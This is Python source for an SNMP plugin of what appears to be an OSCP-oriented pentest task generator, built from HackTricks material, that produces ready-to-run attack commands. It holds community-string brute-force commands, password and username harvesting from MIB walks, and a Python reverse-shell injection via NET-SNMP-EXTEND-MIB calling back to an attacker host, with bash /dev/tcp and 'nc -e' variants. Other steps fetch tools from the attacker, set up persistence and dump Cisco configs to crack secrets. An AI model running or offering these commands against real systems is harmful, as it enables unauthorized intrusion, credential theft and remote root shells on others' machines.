"""
SNMP service enumeration plugin

Generates tasks for SNMP enumeration including:
- Community string brute-forcing (public/private defaults)
- MIB tree walking and OID enumeration
- Windows/Linux-specific OID queries
- SNMP RCE via NET-SNMP-EXTEND-MIB (write access)
- Configuration file analysis

Extracted from HackTricks: pentesting-snmp/README.md, snmp-rce.md, cisco-snmp.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class SNMPPlugin(ServicePlugin):
    """SNMP (Simple Network Management Protocol) enumeration plugin"""

    @property
    def name(self) -> str:
        return "snmp"

    @property
    def default_ports(self) -> List[int]:
        return [161, 162, 10161, 10162]

    @property
    def service_names(self) -> List[str]:
        return ['snmp', 'snmpd', 'snmp-agent']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect SNMP services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate SNMP enumeration task tree"""
        version = service_info.get('version', '')
        product = service_info.get('product', '')

        tasks = {
            'id': f'snmp-enum-{port}',
            'name': f'SNMP Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Quick SNMP Check with default community
        tasks['children'].append({
            'id': f'snmp-check-{port}',
            'name': 'Quick SNMP Check (Public Community)',
            'type': 'command',
            'metadata': {
                'command': f'snmp-check {target} -p {port} -c public',
                'description': 'Quick enumeration using "public" community string',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    'snmp-check': 'Automated SNMP enumeration tool',
                    '-p': f'Target port {port}',
                    '-c public': 'Community string (default read-only)',
                },
                'success_indicators': [
                    'System information displayed (hostname, OS, uptime)',
                    'Network interfaces enumerated',
                    'Running processes listed',
                    'User accounts discovered'
                ],
                'failure_indicators': [
                    'No response (wrong community string)',
                    'Timeout (firewall blocking)',
                    'Access denied (IP restriction)',
                ],
                'next_steps': [
                    'If successful: Check output for credentials in process strings',
                    'If failed: Brute-force community strings',
                    'Try "private" community for write access',
                    'Enumerate specific OIDs manually'
                ],
                'alternatives': [
                    f'snmpwalk -v2c -c public {target} .1',
                    f'nmap --script "snmp* and not snmp-brute" {target} -p {port}',
                    f'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target}'
                ],
                'notes': 'Port 161 = agent requests, Port 162 = trap notifications. Community strings in v1/v2c are plaintext. If "public" works, enumerate everything before alerting defenses.',
                'estimated_time': '2-3 minutes'
            }
        })

        # TASK 2: Community String Brute-force
        tasks['children'].append({
            'id': f'snmp-brute-{port}',
            'name': 'Community String Brute-force',
            'type': 'parent',
            'children': [
                {
                    'id': f'onesixtyone-{port}',
                    'name': 'OneSixtyOne Brute-force',
                    'type': 'command',
                    'metadata': {
                        'command': f'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt {target} -w 100',
                        'description': 'Fast community string brute-force (100 threads)',
                        'tags': ['OSCP:HIGH', 'BRUTE_FORCE', 'NOISY'],
                        'flag_explanations': {
                            'onesixtyone': 'Fast SNMP scanner (custom stack, no net-snmp libs)',
                            '-c': 'Community string wordlist',
                            '-w 100': 'Wait 100ms between packets (speed vs stealth)',
                        },
                        'success_indicators': [
                            'Valid community string found (outputs hostname/response)',
                            'Multiple communities discovered (public, private, custom)',
                        ],
                        'failure_indicators': [
                            'No responses (all strings invalid or firewall)',
                            'All timeouts (service down)',
                        ],
                        'next_steps': [
                            'Test each found community with snmpwalk',
                            'Try write operations with "private" or RW strings',
                            'Check if SNMPv3 is enabled (more secure)',
                        ],
                        'alternatives': [
                            f'nmap --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target} -p {port}',
                            f'hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -v {target} snmp',
                            'Manual: Try "public", "private", "manager", "cisco", company name',
                        ],
                        'notes': 'In v1/v2c, server does NOT respond to wrong community strings (silent failure). Valid community = response received.',
                        'estimated_time': '5-10 minutes'
                    }
                },
                {
                    'id': f'hydra-snmp-{port}',
                    'name': 'Hydra SNMP Brute-force',
                    'type': 'command',
                    'metadata': {
                        'command': f'hydra -P /usr/share/wordlists/rockyou.txt -v {target} snmp',
                        'description': 'Comprehensive brute-force with large wordlist',
                        'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'NOISY', 'SLOW'],
                        'flag_explanations': {
                            '-P': 'Password/community string wordlist',
                            '-v': 'Verbose output (show attempts)',
                            'snmp': 'Target SNMP service',
                        },
                        'success_indicators': [
                            'Valid community string cracked',
                            '[161][snmp] host: ... login: public',
                        ],
                        'failure_indicators': [
                            'All attempts failed',
                            'Connection timeouts',
                        ],
                        'next_steps': [
                            'Use found community for full enumeration',
                            'Check write permissions',
                        ],
                        'alternatives': [
                            'Use smaller wordlist first: /usr/share/wordlists/metasploit/common_passwords.txt',
                            'Custom wordlist with company name, location, device type',
                        ],
                        'notes': 'Very slow compared to onesixtyone. Use only if fast methods fail.',
                        'estimated_time': '30+ minutes (depends on wordlist size)'
                    }
                }
            ]
        })

        # TASK 3: Full MIB Walk
        tasks['children'].append({
            'id': f'snmpwalk-{port}',
            'name': 'Full MIB Tree Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': f'snmpwalk-full-{port}',
                    'name': 'Walk Entire OID Tree',
                    'type': 'command',
                    'metadata': {
                        'command': f'snmpwalk -v2c -c <COMMUNITY> {target} .1 | tee snmpwalk-{target}.txt',
                        'description': 'Enumerate all SNMP OIDs (complete MIB tree)',
                        'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            '-v2c': 'SNMP version 2c (plaintext, most common)',
                            '-c <COMMUNITY>': 'Community string (replace with found value)',
                            '.1': 'Root OID (starts at ISO tree, enumerates everything)',
                            '| tee': 'Save output to file while displaying',
                        },
                        'success_indicators': [
                            'Large output (hundreds/thousands of OIDs)',
                            'System info: hostname, OS, uptime, users',
                            'Network: interfaces, IPs, routes, connections',
                            'Processes: running programs with paths/arguments',
                            'Storage: mounted drives, disk usage',
                        ],
                        'failure_indicators': [
                            'Timeout No Response (wrong community)',
                            'Empty output',
                            'Access denied errors',
                        ],
                        'next_steps': [
                            'Search output for passwords: grep -i "passw\\|cred\\|secret" snmpwalk-{target}.txt',
                            'Find usernames: grep -i "user\\|account" snmpwalk-{target}.txt',
                            'Check running processes for sensitive data',
                            'Look for private community strings in trap configs',
                        ],
                        'alternatives': [
                            f'snmpbulkwalk -v2c -c <COMMUNITY> {target} . | tee snmpbulkwalk-{target}.txt  # Faster for large trees',
                            f'snmp-check {target} -c <COMMUNITY>  # Automated, human-readable',
                            'Manually query specific OIDs (see Windows/Linux OID tasks)',
                        ],
                        'notes': 'Install snmp-mibs-downloader + download-mibs + comment "mibs:" in /etc/snmp/snmp.conf to see OID names instead of numbers. Can output MB of data.',
                        'estimated_time': '5-15 minutes (depends on device complexity)'
                    }
                },
                {
                    'id': f'snmpwalk-extended-{port}',
                    'name': 'Extended Queries (nsExtendObjects)',
                    'type': 'command',
                    'metadata': {
                        'command': f'snmpwalk -v2c -c <COMMUNITY> {target} NET-SNMP-EXTEND-MIB::nsExtendObjects',
                        'description': 'Check for custom SNMP extensions (may reveal RCE vectors)',
                        'tags': ['OSCP:HIGH', 'ENUM', 'EXPLOIT'],
                        'flag_explanations': {
                            'NET-SNMP-EXTEND-MIB::nsExtendObjects': 'Extended MIB table with custom commands',
                        },
                        'success_indicators': [
                            'Custom commands/scripts listed',
                            'nsExtendCommand entries with executable paths',
                        ],
                        'failure_indicators': [
                            'No Such Object available (no extensions configured)',
                            'Empty output',
                        ],
                        'next_steps': [
                            'If RW community exists: Inject malicious commands (see SNMP RCE task)',
                            'Analyze existing commands for sensitive paths',
                        ],
                        'alternatives': [
                            f'snmpwalk -v2c -c <COMMUNITY> {target} .1.3.6.1.4.1.8072.1.3.2  # Numeric OID',
                        ],
                        'notes': 'Extended queries allow executing system commands. If write access exists, this is RCE vector.',
                    }
                }
            ]
        })

        # TASK 4: Windows-Specific OID Enumeration
        tasks['children'].append({
            'id': f'snmp-windows-{port}',
            'name': 'Windows-Specific OID Queries',
            'type': 'parent',
            'children': [
                {
                    'id': f'win-processes-{port}',
                    'name': 'Enumerate Windows Processes',
                    'type': 'command',
                    'metadata': {
                        'command': f'snmpwalk -v2c -c <COMMUNITY> {target} 1.3.6.1.2.1.25.4.2.1.2',
                        'description': 'List running programs (may contain passwords in args)',
                        'tags': ['OSCP:HIGH', 'ENUM', 'WINDOWS'],
                        'flag_explanations': {
                            '1.3.6.1.2.1.25.4.2.1.2': 'hrSWRunName (running program names)',
                        },
                        'success_indicators': [
                            'List of processes: explorer.exe, cmd.exe, powershell.exe',
                            'Services running',
                        ],
                        'failure_indicators': [
                            'No Such Object',
                            'Empty output (not Windows)',
                        ],
                        'next_steps': [
                            'Get process paths: snmpwalk -v2c -c <COMMUNITY> {target} 1.3.6.1.2.1.25.4.2.1.4',
                            'Check process parameters for credentials',
                            'Cross-reference with storage/software OIDs',
                        ],
                        'alternatives': [
                            'Manual via Windows: Get-Process (if shell access)',
                            'Process paths OID: 1.3.6.1.2.1.25.4.2.1.4',
                        ],
                        'notes': 'Combine with process path OID to find executable locations. Check for credentials in command-line arguments.',
                    }
                },
                {
                    'id': f'win-users-{port}',
                    'name': 'Enumerate Windows User Accounts',
                    'type': 'command',
                    'metadata': {
                        'command': f'snmpwalk -v2c -c <COMMUNITY> {target} 1.3.6.1.4.1.77.1.2.25',
                        'description': 'List local user accounts',
                        'tags': ['OSCP:HIGH', 'ENUM', 'WINDOWS'],
                        'flag_explanations': {
                            '1.3.6.1.4.1.77.1.2.25': 'svSvcTable (user account table)',
                        },
                        'success_indicators': [
                            'List of usernames: Administrator, Guest, custom users',
                        ],
                        'failure_indicators': [
                            'No Such Object',
                            'Access denied (read-only OID)',
                        ],
                        'next_steps': [
                            'Create username list for SMB/RDP brute-force',
                            'Check for service accounts',
                            'Combine with password brute-force',
                        ],
                        'alternatives': [
                            'Manual: net user (if shell access)',
                            'SMB enumeration: enum4linux, crackmapexec',
                        ],
                        'notes': 'Build wordlist for targeted attacks. Service accounts often have weak passwords.',
                    }
                },
                {
                    'id': f'win-software-{port}',
                    'name': 'Enumerate Installed Software',
                    'type': 'command',
                    'metadata': {
                        'command': f'snmpwalk -v2c -c <COMMUNITY> {target} 1.3.6.1.2.1.25.6.3.1.2',
                        'description': 'List installed applications (version info for exploits)',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'WINDOWS'],
                        'flag_explanations': {
                            '1.3.6.1.2.1.25.6.3.1.2': 'hrSWInstalledName (installed software names)',
                        },
                        'success_indicators': [
                            'List of applications with versions',
                            'Third-party software identified',
                        ],
                        'failure_indicators': [
                            'No Such Object',
                            'Empty list (minimal installation)',
                        ],
                        'next_steps': [
                            'Search versions on searchsploit',
                            'Check for known vulnerable software',
                            'Cross-reference with CVE databases',
                        ],
                        'alternatives': [
                            'Manual: wmic product get name,version',
                            'Registry: reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
                        ],
                        'notes': 'Focus on outdated or EOL software. Check for dev tools (Python, compilers) indicating dev box.',
                    }
                },
                {
                    'id': f'win-ports-{port}',
                    'name': 'Enumerate TCP Local Ports',
                    'type': 'command',
                    'metadata': {
                        'command': f'snmpwalk -v2c -c <COMMUNITY> {target} 1.3.6.1.2.1.6.13.1.3',
                        'description': 'List listening TCP ports (find hidden services)',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'WINDOWS'],
                        'flag_explanations': {
                            '1.3.6.1.2.1.6.13.1.3': 'tcpConnLocalPort (listening TCP ports)',
                        },
                        'success_indicators': [
                            'List of listening ports: 80, 443, 3389, 445, etc.',
                            'Unusual high ports discovered',
                        ],
                        'failure_indicators': [
                            'No Such Object',
                            'Empty list',
                        ],
                        'next_steps': [
                            'Scan discovered ports with nmap',
                            'Compare with external scan (find firewalled ports)',
                            'Investigate non-standard ports',
                        ],
                        'alternatives': [
                            'Manual: netstat -ano',
                            'Nmap: nmap -p- {target}',
                        ],
                        'notes': 'SNMP may reveal internally-bound ports not visible externally. Check for databases, admin panels.',
                    }
                }
            ]
        })

        # TASK 5: SNMP RCE (Write Access Required)
        tasks['children'].append({
            'id': f'snmp-rce-{port}',
            'name': 'SNMP RCE (Requires RW Community)',
            'type': 'parent',
            'children': [
                {
                    'id': f'snmp-rce-test-{port}',
                    'name': 'Test Write Access',
                    'type': 'command',
                    'metadata': {
                        'command': f'snmpset -v2c -c <PRIVATE_COMMUNITY> {target} 1.3.6.1.2.1.1.5.0 s "testwrite"',
                        'description': 'Test if RW community can modify OIDs (write sysName)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'flag_explanations': {
                            'snmpset': 'SNMP write command',
                            '-c <PRIVATE_COMMUNITY>': 'RW community string (e.g., "private")',
                            '1.3.6.1.2.1.1.5.0': 'sysName OID (hostname)',
                            's "testwrite"': 'String value to set',
                        },
                        'success_indicators': [
                            'Value set successfully',
                            'No error returned',
                            'Verify: snmpget -v2c -c public {target} 1.3.6.1.2.1.1.5.0',
                        ],
                        'failure_indicators': [
                            'noSuchName error (OID read-only)',
                            'readOnly error (community is read-only)',
                            'Timeout (wrong community)',
                        ],
                        'next_steps': [
                            'If write works: Inject commands via NET-SNMP-EXTEND-MIB',
                            'If fails: Try other RW communities',
                            'Restore original value if write successful',
                        ],
                        'alternatives': [
                            'Test with different OID: 1.3.6.1.2.1.1.6.0 (sysLocation)',
                            'Brute-force RW communities separately',
                        ],
                        'notes': 'Some OIDs are always read-only. Write access is rare but allows full RCE on Linux with NET-SNMP.',
                    }
                },
                {
                    'id': f'snmp-rce-shell-{port}',
                    'name': 'Inject Reverse Shell Command',
                    'type': 'command',
                    'metadata': {
                        'command': f'snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c <PRIVATE_COMMUNITY> {target} \'nsExtendStatus."revshell"\' = createAndGo \'nsExtendCommand."revshell"\' = /usr/bin/python3 \'nsExtendArgs."revshell"\' = \'-c "import socket,subprocess,os;s=socket.socket();s.connect((\\"<LHOST>\\",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/bash\\",\\"-i\\"])"\'',
                        'description': 'Inject Python reverse shell via NET-SNMP-EXTEND-MIB (RCE)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE'],
                        'flag_explanations': {
                            '-m +NET-SNMP-EXTEND-MIB': 'Load extended MIB module',
                            'nsExtendStatus."revshell" = createAndGo': 'Create new extend entry',
                            'nsExtendCommand."revshell"': 'Executable path (/usr/bin/python3)',
                            'nsExtendArgs."revshell"': 'Command arguments (reverse shell payload)',
                            '<LHOST>': 'Your attacker IP (replace)',
                            '<LPORT>': 'Your listener port (replace)',
                        },
                        'success_indicators': [
                            'snmpset succeeds without error',
                            'Reverse shell connects to nc listener',
                            'Shell spawned as SNMP daemon user (often root)',
                        ],
                        'failure_indicators': [
                            'Permission denied (no write access)',
                            'No Such Name (MIB not supported)',
                            'Python not found (try /usr/bin/python2)',
                        ],
                        'next_steps': [
                            'Set up listener first: nc -lvnp <LPORT>',
                            'Trigger command: snmpwalk -v2c -c <COMMUNITY> {target} NET-SNMP-EXTEND-MIB::nsExtendObjects',
                            'Stabilize shell: python3 -c "import pty;pty.spawn(\'/bin/bash\')"',
                            'Check privileges: id, whoami',
                        ],
                        'alternatives': [
                            'Use snmp-shell tool: git clone https://github.com/mxrch/snmp-shell && python3 snmp-shell.py -t {target} -c <COMMUNITY>',
                            'Bash reverse shell: /bin/bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"',
                            'Netcat reverse shell: /bin/nc -e /bin/bash <LHOST> <LPORT>',
                        ],
                        'notes': 'RCE works via run-on-read() behavior: command executes when OID is read via snmpwalk. Must use absolute path to executable. SNMP daemon often runs as root. Clean up after: snmpset to delete nsExtend entry.',
                        'estimated_time': '5-10 minutes (including listener setup)'
                    }
                },
                {
                    'id': f'snmp-rce-tool-{port}',
                    'name': 'Automated RCE with snmp-shell',
                    'type': 'command',
                    'metadata': {
                        'command': f'# Setup:\n# git clone https://github.com/mxrch/snmp-shell\n# cd snmp-shell && pip3 install -r requirements.txt\npython3 snmp-shell.py -t {target} -c <PRIVATE_COMMUNITY> -p {port}',
                        'description': 'Automated SNMP shell using mxrch tool (interactive)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'AUTOMATED'],
                        'flag_explanations': {
                            '-t': 'Target IP',
                            '-c': 'RW community string',
                            '-p': 'SNMP port (default 161)',
                        },
                        'success_indicators': [
                            'Interactive shell prompt',
                            'Commands execute on target',
                            'Output returned to terminal',
                        ],
                        'failure_indicators': [
                            'Connection refused',
                            'No write permissions',
                            'Tool errors',
                        ],
                        'next_steps': [
                            'Upload tools: wget http://<LHOST>/linpeas.sh',
                            'Establish persistence',
                            'Escalate privileges if not root',
                        ],
                        'alternatives': [
                            'Manual snmpset injection (see above)',
                            'Metasploit: use exploit/linux/snmp/net_snmpd_rw_access',
                        ],
                        'notes': 'Tool automates nsExtend injection. Requires: sudo apt install snmp snmp-mibs-downloader rlwrap',
                    }
                }
            ]
        })

        # TASK 6: Cisco-Specific SNMP Attacks
        if 'cisco' in product.lower() or 'ios' in version.lower():
            tasks['children'].append({
                'id': f'snmp-cisco-{port}',
                'name': 'Cisco-Specific SNMP Attacks',
                'type': 'parent',
                'children': [
                    {
                        'id': f'cisco-config-dump-{port}',
                        'name': 'Dump Cisco Config via SNMP (RW Required)',
                        'type': 'command',
                        'metadata': {
                            'command': f'nmap --script snmp-ios-config --script-args creds.snmp=<PRIVATE_COMMUNITY> {target} -p {port}',
                            'description': 'Dump running-config/startup-config via CISCO-CONFIG-COPY-MIB',
                            'tags': ['OSCP:HIGH', 'EXPLOIT', 'CISCO'],
                            'flag_explanations': {
                                '--script snmp-ios-config': 'Nmap script to dump Cisco configs via SNMP',
                                '--script-args creds.snmp=<PRIVATE_COMMUNITY>': 'RW community string',
                            },
                            'success_indicators': [
                                'Configuration dumped to stdout',
                                'Passwords visible (enable secret, username X secret)',
                                'SNMP community strings revealed',
                            ],
                            'failure_indicators': [
                                'No write access (needs RW community)',
                                'TFTP server error',
                                'Script timeout',
                            ],
                            'next_steps': [
                                'Extract hashes: grep -E "enable secret|username .* secret"',
                                'Crack hashes: john --format=md5crypt hashes.txt',
                                'Check for VTY passwords (plaintext)',
                                'Look for SNMP RW community strings in config',
                            ],
                            'alternatives': [
                                'Manual snmpset: see HackTricks cisco-snmp.md for full sequence',
                                'Metasploit: use auxiliary/scanner/snmp/cisco_config_tftp',
                                'Setup TFTP server and trigger copy manually',
                            ],
                            'notes': 'Requires RW community. Uses MIB 1.3.6.1.4.1.9.9.96 to copy config to TFTP server. Row IDs are one-shot (5min cooldown). Config may contain enable passwords (type 5 = MD5, crackable) and VTY passwords.',
                        }
                    },
                    {
                        'id': f'cisco-vuln-check-{port}',
                        'name': 'Check Cisco SNMP CVEs',
                        'type': 'manual',
                        'metadata': {
                            'description': 'Check for recent Cisco SNMP vulnerabilities',
                            'tags': ['OSCP:MEDIUM', 'RESEARCH', 'CISCO'],
                            'success_indicators': [
                                'Vulnerable IOS version identified',
                                'CVE matches version',
                            ],
                            'next_steps': [
                                'CVE-2025-20174: Crafted SNMP packet DoS (authenticated)',
                                'CVE-2024-20373: IPv4 ACL bypass (unauthenticated polling)',
                                'Search: searchsploit cisco snmp',
                                'Check Cisco security advisories',
                            ],
                            'alternatives': [
                                'Version detection: snmpwalk sysDescr.0',
                                'Nmap version scan: nmap -sV -p {port} {target}',
                            ],
                            'notes': 'Modern Cisco devices prefer SNMPv3. v1/v2c are legacy but still common. Check for ACL misconfigurations.',
                        }
                    }
                ]
            })

        # TASK 7: Configuration File Analysis
        tasks['children'].append({
            'id': f'snmp-config-{port}',
            'name': 'Examine SNMP Configuration Files',
            'type': 'manual',
            'metadata': {
                'description': 'Review SNMP config files if file access exists (SSH/FTP/NFS)',
                'tags': ['OSCP:LOW', 'POST_EXPLOIT', 'MANUAL'],
                'success_indicators': [
                    'Community strings found in config',
                    'RW communities identified',
                    'IP restrictions discovered',
                ],
                'next_steps': [
                    'Check /etc/snmp/snmpd.conf (Linux)',
                    'Check /etc/snmp/snmp.conf',
                    'Check C:\\\\Windows\\\\System32\\\\snmp.conf (Windows)',
                    'Look for: rocommunity, rwcommunity, createUser (SNMPv3)',
                    'Test extracted communities',
                ],
                'alternatives': [
                    'If shell access: cat /etc/snmp/snmpd.conf | grep -v "^#"',
                    'Windows registry: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s',
                ],
                'notes': 'Config files reveal community strings, allowed IPs, and security settings. rwcommunity = full write access. SNMPv3 users stored with hashed passwords.',
            }
        })

        # TASK 8: SNMPv3 Enumeration (if detected)
        if 'v3' in version.lower() or 'snmpv3' in service_info.get('extrainfo', '').lower():
            tasks['children'].append({
                'id': f'snmpv3-enum-{port}',
                'name': 'SNMPv3 Enumeration (Encrypted)',
                'type': 'parent',
                'children': [
                    {
                        'id': f'snmpv3-users-{port}',
                        'name': 'Enumerate SNMPv3 Users',
                        'type': 'command',
                        'metadata': {
                            'command': f'nmap --script snmp-brute --script-args snmp-brute.protocol=3 {target} -p {port}',
                            'description': 'Attempt to brute-force SNMPv3 credentials',
                            'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'V3'],
                            'flag_explanations': {
                                '--script snmp-brute': 'Nmap SNMP brute-force script',
                                '--script-args snmp-brute.protocol=3': 'Target SNMPv3 (not v1/v2c)',
                            },
                            'success_indicators': [
                                'Valid username:password found',
                                'Authentication successful',
                            ],
                            'failure_indicators': [
                                'All attempts failed',
                                'SNMPv3 not configured',
                            ],
                            'next_steps': [
                                'Use found creds with snmpwalk',
                                'Check auth level: noAuthNoPriv, authNoPriv, authPriv',
                                'Enumerate with authenticated access',
                            ],
                            'alternatives': [
                                'Hydra: hydra -L users.txt -P passwords.txt {target} snmp -s {port} -V 3',
                                'Manual: snmpwalk -v3 -u <USERNAME> -a SHA -A <AUTHPASS> -x AES -X <PRIVPASS> {target}',
                            ],
                            'notes': 'SNMPv3 uses encrypted traffic and username/password auth. Much harder to brute-force than v1/v2c community strings. Focus on weak/default creds.',
                        }
                    }
                ]
            })

        # TASK 9: Massive SNMP Scanning (if multiple targets)
        tasks['children'].append({
            'id': f'braa-massive-{port}',
            'name': 'Massive SNMP Scanning with Braa',
            'type': 'command',
            'metadata': {
                'command': f'echo "{target}" > targets.txt && braa public@targets.txt:.1.3.6.* > braa-output.txt',
                'description': 'Fast SNMP enumeration of multiple targets (hundreds simultaneously)',
                'tags': ['OSCP:LOW', 'ENUM', 'ADVANCED'],
                'flag_explanations': {
                    'braa': 'Mass SNMP scanner (custom stack, very fast)',
                    'public@targets.txt': 'Community@target file',
                    '.1.3.6.*': 'OID pattern to query (all under 1.3.6)',
                },
                'success_indicators': [
                    'MB of output data',
                    'OID values returned',
                ],
                'failure_indicators': [
                    'Empty output',
                    'Connection failures',
                ],
                'next_steps': [
                    'Parse output for interesting data (see HackTricks parsing examples)',
                    'Extract emails: grep -E -o "[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}" braa-output.txt',
                    'Find passwords: grep -i "login\\|fail\\|password" braa-output.txt',
                    'Identify private strings: grep -i "trap" braa-output.txt',
                ],
                'alternatives': [
                    'onesixtyone for community brute-force',
                    'snmpwalk for single target deep enumeration',
                ],
                'notes': 'Braa is designed for scanning hundreds of hosts at once. Use when dealing with large networks. Output requires manual parsing.',
            }
        })

        return tasks
